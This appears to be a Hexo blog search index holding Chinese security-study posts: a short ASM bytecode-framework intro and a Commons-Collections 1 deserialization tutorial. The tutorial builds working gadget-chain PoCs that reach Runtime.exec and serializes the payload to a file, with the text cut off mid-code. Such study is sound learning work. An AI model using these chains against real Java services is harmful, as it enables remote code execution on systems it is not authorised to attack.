<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>ASM学习</title>
    <url>/ASM%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<blockquote>
<p>天地不仁，以万物为刍狗；圣人不仁，以百姓为刍狗。</p>
</blockquote>
<p>ASM学习</p>
<span id="more"></span>

<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>ASM官网：<a href="https://asm.ow2.io/">https://asm.ow2.io/</a></p>
<p>ASM是一个通用java字节码操作和分析框架。它可以被用来修改已经存在的class文件，或者直接从二进制文件动态生成class文件。</p>
<p>ASM提供了一些通用的字节码翻译和分析算法，从而可以自己定制。ASM提供了跟其他java字节码相似的功能，但是性能更好。它设计的时候更加侧重于性能。它非常适用于动态系统（当然也可以用于静态系统中，例如编译器）。</p>
<p>ASM被用于许多项目中：</p>
<ul>
<li>OpenJDK，被用于生成 <a href="http://hg.openjdk.java.net/jdk8/jdk8/jdk/file/687fd7c7986d/src/share/classes/java/lang/invoke/InnerClassLambdaMetafactory.java">lambda call sites</a>, 和<a href="https://en.wikipedia.org/wiki/Nashorn_(JavaScript_engine)">Nashorn</a> <a href="http://hg.openjdk.java.net/jdk8/jdk8/nashorn/file/096dc407d310/src/jdk/nashorn/internal/codegen/ClassEmitter.java">compiler</a></li>
<li><a href="http://www.groovy-lang.org/"><strong>Groovy</strong></a>和 <a href="https://kotlinlang.org/"><strong>Kotlin</strong></a> 的编译器</li>
<li><a href="http://cobertura.github.io/cobertura/"><strong>Cobertura</strong></a>， <a href="http://www.eclemma.org/jacoco/"><strong>Jacoco</strong></a>。被用于代码覆盖率测量</li>
<li><a href="https://github.com/cglib/cglib"><strong>CGLIB</strong></a>，动态生成代理类</li>
<li><a href="https://gradle.org/"><strong>Gradle</strong></a>，实时生成类</li>
</ul>
<p>ASM可以从 <a href="https://repository.ow2.org/">OW2 Maven repository</a>下载，或者从Maven中央仓库下载。</p>
<p>简单的说，ASM可以读取解析<code>class</code>文件内容，并提供接口让你可以对<code>class</code>文件字节码内容进行CRUD操作。</p>
<p>未完待续……</p>
]]></content>
      <categories>
        <category>java安全</category>
      </categories>
      <tags>
        <tag>java基础</tag>
      </tags>
  </entry>
  <entry>
    <title>Commons-Collections-1</title>
    <url>/Commons-Collections-1/</url>
    <content><![CDATA[<blockquote>
<p>醉后不知天在水，满船清梦压星河。</p>
</blockquote>
<p>Commons Collections 1反序列化链学习</p>
<span id="more"></span>



<h2 id="1-简介"><a href="#1-简介" class="headerlink" title="1. 简介"></a>1. 简介</h2><p>在jdk1.2中的更新，主要就是java Collections框架，自从变成java处理collection的标准之后，它强大的数据结构大大提高了开发应用的效率。</p>
<p>Commons-Collections对原有的 java Collections进行了扩展增加，有许多新的特性，包括：</p>
<ul>
<li><p>Bag 接口，为有多个副本的集合对象提供接口</p>
</li>
<li><p>BidiMap接口，为maps提供值到键，键到值的查询接口</p>
</li>
<li><p>MapIterator，为maps的迭代器提供简单快速的接口</p>
</li>
<li><p><strong>每个对象在添加到集合中时，提供改变每个对象的装饰器</strong></p>
</li>
<li><p>使多个集合看起来像复合集合</p>
<p>。。。。。。</p>
</li>
</ul>
<p><strong>Commons Collections实现了一个TransformedMap类，该类是对Java标准数据结构Map接口的一个扩展。该类可以在一个元素被加入到集合内时，自动对该元素进行特定的修饰变换，具体的变换逻辑由Transformer类定义，Transformer在TransformedMap实例化时作为参数传入。</strong></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">https:<span class="regexp">//</span>commons.apache.org<span class="regexp">/proper/</span>commons-collections/index.html</span><br><span class="line">http:<span class="regexp">//</span>archive.apache.org<span class="regexp">/dist/</span>commons<span class="regexp">/collections/</span>binaries/</span><br></pre></td></tr></table></figure>



<h2 id="2-POC复现"><a href="#2-POC复现" class="headerlink" title="2. POC复现"></a>2. POC复现</h2><ol>
<li><p>新建一个maven工程</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li><p>网上流传的poc</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cc1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">cc01</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将transformers数组存入ChaniedTransformer这个继承类</span></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建Map并绑定transformerChina</span></span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">        <span class="comment">//给予map数据转化链</span></span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//触发漏洞</span></span><br><span class="line">        Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();</span><br><span class="line">        <span class="comment">//outerMap后一串东西，其实就是获取这个map的第一个键值对（value,value）；然后转化成Map.Entry形式，这是map的键值对数据格式</span></span><br><span class="line">        onlyElement.setValue(<span class="string">&quot;foobar&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="3-POC构造"><a href="#3-POC构造" class="headerlink" title="3. POC构造"></a>3. POC构造</h2><h3 id="3-1-直接调用"><a href="#3-1-直接调用" class="headerlink" title="3.1 直接调用"></a>3.1 直接调用</h3><p>看一下InvokerTransformer类的transform函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class cls = input.getClass();</span><br><span class="line">            Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="keyword">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException var6) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="keyword">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException var7) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="keyword">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, var7);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>简化一下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">    Class cls = input.getClass();</span><br><span class="line">    Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line">    <span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>看一下对应的构造函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.iMethodName = methodName;</span><br><span class="line">    <span class="keyword">this</span>.iParamTypes = paramTypes;</span><br><span class="line">    <span class="keyword">this</span>.iArgs = args;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>通过构造的反射机制以及以上代码进行填空，可以得出当变量等于以下值时，可形成命令执行：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Object input=Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>));</span><br><span class="line"><span class="keyword">this</span>.iMethodName=<span class="string">&quot;exec&quot;</span></span><br><span class="line"><span class="keyword">this</span>.iParamTypes=String.class</span><br><span class="line"><span class="keyword">this</span>.iArgs=<span class="string">&quot;open -a calculator&quot;</span></span><br></pre></td></tr></table></figure>





<p>通过函数调用POC就为：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cc1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.tools.internal.xjc.reader.xmlschema.BindPurple;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Object input=Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(Class.forName(&quot;java.lang.Runtime&quot;));</span></span><br><span class="line"><span class="comment"> * this.iMethodName=&quot;exec&quot;</span></span><br><span class="line"><span class="comment"> * this.iParamTypes=String.class</span></span><br><span class="line"><span class="comment"> * this.iArgs=&quot;open -a calculator&quot;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *     public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123;</span></span><br><span class="line"><span class="comment"> *         this.iMethodName = methodName;</span></span><br><span class="line"><span class="comment"> *         this.iParamTypes = paramTypes;</span></span><br><span class="line"><span class="comment"> *         this.iArgs = args;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Cc01Demo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//通过构造函数，输入对应格式的参数，对iMethodName、iParamTypes、iArgs进行赋值</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        InvokerTransformer invokertransformer = <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">                <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> Class[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> String[]&#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建invokertransformer对象后调用transform方法</span></span><br><span class="line">        <span class="comment">//Object inputobj = Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(Class.forName(&quot;java.lang.Runtime&quot;));</span></span><br><span class="line">        Runtime runtime = Runtime.getRuntime();</span><br><span class="line">        invokertransformer.transform(runtime);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h3 id="3-2-同一个函数中进行序列化"><a href="#3-2-同一个函数中进行序列化" class="headerlink" title="3.2 同一个函数中进行序列化"></a>3.2 同一个函数中进行序列化</h3><p>使用文件写入，代替网络传输</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cc1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">cc01Demo2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//通过构造函数，输入对应格式的参数，对iMethodName、iParamTypes、iArgs进行赋值</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        InvokerTransformer invokertransformer = <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">                <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> Class[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> String[]&#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将invokertransformer作为文件输入流输出为payload.bin</span></span><br><span class="line">        FileOutputStream fileOutputStream = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;payload.bin&quot;</span>);</span><br><span class="line">        ObjectOutput objectOutput = <span class="keyword">new</span> ObjectOutputStream(fileOutputStream);</span><br><span class="line">        objectOutput.writeObject(invokertransformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//从payload.bin读取invokertransformer</span></span><br><span class="line">        FileInputStream fileInputStream = <span class="keyword">new</span> FileInputStream(<span class="string">&quot;payload.bin&quot;</span>);</span><br><span class="line">        ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(fileInputStream);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建invokertransformer对象后调用transform方法</span></span><br><span class="line">        <span class="comment">//Object inputobj = Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(Class.forName(&quot;java.lang.Runtime&quot;));</span></span><br><span class="line">        Runtime runtime = Runtime.getRuntime();</span><br><span class="line"></span><br><span class="line">        InvokerTransformer payloadInput = (InvokerTransformer) objectInputStream.readObject();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        payloadInput.transform(runtime);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h3 id="3-3-网络传输时"><a href="#3-3-网络传输时" class="headerlink" title="3.3 网络传输时"></a>3.3 网络传输时</h3><p>ChainedTransformer类中，</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">        object = <span class="keyword">this</span>.iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里会遍历iTransformers数组，依次调用这个数组中每一个Transformer的transform，并串行传递执行结果。</p>
<p>首先确定iTransformers可控，<strong>iTransformers数组</strong>是通过<strong>ChainedTransformer</strong>类的<strong>构造函数</strong>赋值的。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.iTransformers = transformers;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>我们可以通过创建一个ChainedTransformer对象来控制iTransformers数组</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br></pre></td></tr></table></figure>



<p>那我们就把payload封装成Transformer[]。然后作为构造函数的参数创建一个ChainedTransformer对象</p>
<p>首先Transformer是一个接口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Transformer</span> </span>&#123;</span><br><span class="line">    <span class="function">Object <span class="title">transform</span><span class="params">(Object var1)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那么我们封装payload的时候就要转换成Transformer的实现类。</p>
<p>InvokerTransformer 继承了Transformer 和 Serializable</p>
<p>ConstantTransformer也继承了Transformer</p>
<p>这里用InvokerTransformer来改造poc</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cc1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Cc01Demo3</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//客户端poc</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//服务端poc</span></span><br><span class="line">        Runtime runtime = Runtime.getRuntime();</span><br><span class="line">        transformerChain.transform(runtime);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>上述poc有个问题就是服务端需要我们创建一个Runtime对象，我们不可能控制服务端。所以我们需要在数组中进行串行调用。</p>
<p>先获取Runtime对象，再通过Runtime对象执行方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cc1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Cc01Demo4</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.getRuntime()),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class &#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        transformerChain.transform(<span class="keyword">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>那么如果我们反序列化呢</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cc1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Cc01Demo5</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="comment">//new ConstantTransformer(Runtime.getRuntime()),</span></span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>))),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class &#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">        FileOutputStream f = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;payload.bin&quot;</span>);</span><br><span class="line">        ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(f);</span><br><span class="line">        fout.writeObject(transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//服务端反序列化payload读取</span></span><br><span class="line">        FileInputStream fi = <span class="keyword">new</span> FileInputStream(<span class="string">&quot;payload.bin&quot;</span>);</span><br><span class="line">        ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(fi);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//服务端反序列化成ChainedTransformer格式，并在服务端自主传入恶意参数input</span></span><br><span class="line">        Transformer transformerChain_now = (ChainedTransformer) fin.readObject();</span><br><span class="line">        transformerChain_now.transform(<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>是会失败的，因为Runtime类没有继承Serializable，无法在服务端反序列化成功。</p>
<p>既然我们没法在客户端序列化写入Runtime的实例，那就让服务端执行我们的命令生成一个Runtime实例</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cc1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Cc01Demo06</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.getRuntime()),<span class="comment">//得到Runtime class</span></span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> Class[]&#123;&#125;,<span class="keyword">new</span> Object[]&#123;&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        transformerChain.transform(<span class="keyword">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>最终的poc</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cc1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">POC0</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="comment">//1. 获取Runtime Class</span></span><br><span class="line">                <span class="comment">//new ConstantTransformer(Class.forName(&quot;java.lang.Runtime&quot;))</span></span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;Object.class, 